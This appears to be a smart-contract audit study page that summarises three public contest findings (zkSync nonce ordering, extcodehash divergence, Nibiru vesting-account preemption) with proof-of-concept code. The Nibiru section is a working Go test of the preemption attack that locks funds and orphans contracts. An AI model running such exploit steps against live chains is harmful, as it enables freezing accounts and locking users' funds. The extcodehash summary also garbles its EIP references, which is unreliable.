# ETAAcademy-Adudit: 4. Account

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Account</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>EVM</th>
          <td>account</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [Medium] Nonce ordering of EOA can be updated to "arbitary" through an L1 tx

### EOA nonce ordering manipulated via L1 transaction

- Summary: This vulnerability enables the manipulation of an Externally Owned Account (EOA)'s nonce ordering to an arbitrary state through an L1 priority transaction, leading to the permanent freezing of the user's account.
- Impact & Recommendation: Once the nonce ordering is updated to an arbitrary state, it becomes permanent, rendering the account unable to initiate any new transactions.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#m-06-nonce-ordering-of-eoa-can-be-updated-to-arbitrary-through-an-l1-tx) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```solidity

    function _validateTransaction(
        bytes32 _suggestedSignedHash,
        Transaction calldata _transaction
    ) internal returns (bytes4 magic) {
        // Note, that nonce holder can only be called with "isSystem" flag.
        SystemContractsCaller.systemCallWithPropagatedRevert(
            uint32(gasleft()),
            address(NONCE_HOLDER_SYSTEM_CONTRACT),
            0,
            abi.encodeCall(INonceHolder.incrementMinNonceIfEquals, (_transaction.nonce))
        );
    function incrementMinNonceIfEquals(uint256 _expectedNonce) external onlySystemCall {
        uint256 addressAsKey = uint256(uint160(msg.sender));
        uint256 oldRawNonce = rawNonces[addressAsKey];
        (, uint256 oldMinNonce) = _splitRawNonce(oldRawNonce);
        require(oldMinNonce == _expectedNonce, "Incorrect nonce");
        unchecked {
            rawNonces[addressAsKey] = oldRawNonce + 1;
        }
    }

     // Checks whether the nonce `nonce` have been already used for
        // account `from`. Reverts if the nonce has not been used properly.
        function ensureNonceUsage(from, nonce, shouldNonceBeUsed) {
            // INonceHolder.validateNonceUsage selector
            mstore(0, {{RIGHT_PADDED_VALIDATE_NONCE_USAGE_SELECTOR}})
            mstore(4, from)
            mstore(36, nonce)
            mstore(68, shouldNonceBeUsed)
            let success := call(
                gas(),
                NONCE_HOLDER_ADDR(),
                0,
                0,
                100,
                0,
                0
            )
            if iszero(success) {
                revertWithReason(
                    ACCOUNT_TX_VALIDATION_ERR_CODE(),
                    1
                )
            }
        }
    function validateNonceUsage(address _address, uint256 _key, bool _shouldBeUsed) external view {
        bool isUsed = isNonceUsed(_address, _key);
        if (isUsed && !_shouldBeUsed) {
            revert("Reusing the same nonce twice");
        } else if (!isUsed && _shouldBeUsed) {
            revert("The nonce was not set as used");
        }
    }
    function isNonceUsed(address _address, uint256 _nonce) public view returns (bool) {
        uint256 addressAsKey = uint256(uint160(_address));
        return (_nonce < getMinNonce(_address) || nonceValues[addressAsKey][_nonce] > 0);
    }

    function _execute(Transaction calldata _transaction) internal {
        address to = address(uint160(_transaction.to));
        uint128 value = Utils.safeCastToU128(_transaction.value);
        bytes calldata data = _transaction.data;
        uint32 gas = Utils.safeCastToU32(gasleft());
        // Note, that the deployment method from the deployer contract can only be called with a "systemCall" flag.
        bool isSystemCall;
        if (to == address(DEPLOYER_SYSTEM_CONTRACT) && data.length >= 4) {
            bytes4 selector = bytes4(data[:4]);
            // Check that called function is the deployment method,
            // the others deployer method is not supposed to be called from the default account.
            isSystemCall =
                selector == DEPLOYER_SYSTEM_CONTRACT.create.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.create2.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.createAccount.selector ||
                selector == DEPLOYER_SYSTEM_CONTRACT.create2Account.selector;
        }

            function msgValueSimulatorMimicCall(to, from, value, dataPtr) -> success {
                // Only calls to the deployer system contract are allowed to be system
                let isSystem := eq(to, CONTRACT_DEPLOYER_ADDR())
                success := mimicCallOnlyResult(
                    MSG_VALUE_SIMULATOR_ADDR(),
                    from,
                    dataPtr,
                    0,
                    1,
                    value,
                    to,
                    isSystem
                )
            }

    function updateNonceOrdering(AccountNonceOrdering _nonceOrdering) external onlySystemCall {
        AccountInfo memory currentInfo = accountInfo[msg.sender];
        require(
            _nonceOrdering == AccountNonceOrdering.Arbitrary &&
                currentInfo.nonceOrdering == AccountNonceOrdering.Sequential,
            "It is only possible to change from sequential to arbitrary ordering"
        );
        currentInfo.nonceOrdering = _nonceOrdering;
        _storeAccountInfo(msg.sender, currentInfo);
        emit AccountNonceOrderingUpdated(msg.sender, _nonceOrdering);
    }


  ```

  </details>

## 2. [Medium] Divergences in the Simulation of the extcodehash EVM Opcode

### `keccak256("")` v.s. `bytes32(0)`

- Summary: In the zkSync Era, adherence to EIP-161 criteria determines whether an account is considered "empty" `bytes32(0)`, with no code, zero nonce, and zero balance. However, regardless of the account's balance, zkSync returns bytes32(0) for extcodehash, only considering the nonce and code presence, which diverges from keccak256("") for such accounts with no code in EVM.
- Impact & Recommendation: It accurately emulates the extcodehash EVM opcode as specified by EIP-1051. To mitigate this issue, a recommended solution is provided to precisely simulate the extcodehash EVM opcode based on EIP-1052.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#m-19-divergences-in-the-simulation-of-the-extcodehash-evm-opcode) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```solidity

  function getCodeHash(uint256 _input) external view override returns (bytes32) {
        address account = address(uint160(_input));
        if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && account.balance != 0) {
            return EMPTY_STRING_KECCAK;
        } else if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && address(account).balance == 0) {
            return bytes32(0);
        }
        bytes32 codeHash = getRawCodeHash(account);
        if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) > 0) {
            codeHash = EMPTY_STRING_KECCAK;
        }
        else if (Utils.isContractConstructing(codeHash)) {
            codeHash = EMPTY_STRING_KECCAK;
        } else if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) == 0 && address(account).balance != 0) {
            codeHash = EMPTY_STRING_KECCAK;
        }
        return codeHash;
    }

  ```

  </details>

## 3. [High] Vesting account preemption attack preventing future contract deployment

### Vesting account

- Summary: The vulnerability allowed an attacker to preemptively mark a target address as a vesting account, blocking future contract deployments by preventing the creation of a `codeHash` and making the deployed contract permanently inaccessible. This could disrupt critical ecosystem contracts, such as those planned for LayerZero or Uniswap, and lock associated funds indefinitely. The attack exploited the deterministic nature of contract address generation, enabling an attacker to anticipate and block specific future deployments.
- Impact & Recommendation: The recommended fix was to disable the vesting account feature at the ante handler level. Nibiru confirmed the issue and mitigated it by disabling the built-in `auth/vesting` module functionality, resolving the vulnerability.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-11-nibiru#h-01-vesting-account-preemption-attack-preventing-future-contract-deployment) & [Report](https://code4rena.com/reports/2024-11-nibiru)

  <details><summary>POC</summary>

  ```go

    func (s *Suite) TestVestingAccountPreemptionAttack() {
        deps := evmtest.NewTestDeps()
        // Step-1: Set up the deterministic victim account
        privKeyE, _ := crypto.HexToECDSA("46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c")
        privKey := &ethsecp256k1.PrivKey{
            Key: crypto.FromECDSA(privKeyE),
        }
        ethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)
        deps.Sender = evmtest.EthPrivKeyAcc{
            EthAddr:       ethAddr,
            NibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),
            PrivKey:       privKey,
            KeyringSigner: evmtest.NewSigner(privKey),
        }
        victim := deps.Sender
        fundedAmount := evm.NativeToWei(big.NewInt(100))
        fundedCoin := sdk.NewCoins(sdk.NewCoin("unibi", sdk.NewIntFromBigInt(fundedAmount)))
        s.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))
        s.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))
        // Step-2: Victim account deploys a Factory contract
        gasLimit := big.NewInt(3_000_000)
        initialFundAmt := int64(10)
        initialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))
        createArgs := evmtest.ArgsCreateContract{
            EthAcc:        victim,
            EthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),
            GasPrice:      big.NewInt(1),
            Nonce:         deps.StateDB().GetNonce(victim.EthAddr),
            GasLimit:      gasLimit,
            // Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol
            Value: initialFundToFactory,
        }
        ethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)
        s.Require().NoError(err)
        s.Require().NoError(ethTxMsg.ValidateBasic())
        s.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())
        resp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
        s.Require().NoError(
            err,
            "resp: %s\nblock header: %s",
            resp,
            deps.Ctx.BlockHeader().ProposerAddress,
        )
        s.Require().Empty(resp.VmError)
        // Check if the Factory contract is deployed
        factoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)
        factoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)
        s.Require().NotNil(factoryContractAcc)
        s.Require().True(factoryContractAcc.IsContract())
        codeHash := crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)
        s.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))
        factoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), "unibi")
        s.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())
        // Step-3: Attacker set expected Child contract address as vesting account
        attacker := evmtest.NewEthPrivAcc()
        err = testapp.FundAccount(
            deps.App.BankKeeper,
            deps.Ctx,
            attacker.NibiruAddr,
            sdk.NewCoins(sdk.NewInt64Coin("unibi", 100000000)),
        )
        // NOTE: factory does not create any child contract yet, so the expected child address is 1
        expectedChildAddr := crypto.CreateAddress(factoryAddr, 1)
        var msgServer vestingtypes.MsgServer
        msgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)
        lockedCoin := sdk.NewInt64Coin("unibi", 100)
        lockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(
            attacker.NibiruAddr,
            eth.EthAddrToNibiruAddr(expectedChildAddr),
            sdk.Coins{lockedCoin},
        ))
        s.Require().NoError(err)
        s.Require().NotNil(lockResp)
        // Attacker successfully created a locked account with the expected child address
        // Step-4: Victim tries to deploy a child contract
        input, err := embeds.SmartContract_Factory.ABI.Pack("makeChild")
        s.Require().NoError(err)
        execArgs := evmtest.ArgsExecuteContract{
            EthAcc:          victim,
            EthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),
            ContractAddress: &factoryAddr,
            Data:            input,
            GasPrice:        big.NewInt(1),
            Nonce:           deps.StateDB().GetNonce(victim.EthAddr),
            GasLimit:        gasLimit,
        }
        ethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)
        s.Require().NoError(err)
        s.Require().NoError(ethTxMsg.ValidateBasic())
        s.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())
        _, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
        s.Require().NoError(err)
        // PROOF OF IMPACTS
        // IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because
        // the account's type is not EthAccountI, so it's not accessible.
        childAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)
        s.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)
        // IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.
        childCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)
        childCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)
        s.T().Logf("storage waste: %d bytes", len(childCode))
        // IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.
        acc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))
        _, ok := acc.(exported.VestingAccount)
        s.Require().True(ok)
        input, err = embeds.SmartContract_Child.ABI.Pack("withdraw")
        s.Require().NoError(err)
        // victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens
        execArgs = evmtest.ArgsExecuteContract{
            EthAcc:          victim,
            EthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),
            ContractAddress: &expectedChildAddr,
            Data:            input,
            GasPrice:        big.NewInt(1),
            Nonce:           deps.StateDB().GetNonce(attacker.EthAddr),
            GasLimit:        gasLimit,
        }
        ethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)
        s.Require().NoError(err)
        // No actual state transition happens.
        // code is nil, so just return without executing the contract
        deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)
    }

  ```

  </details>
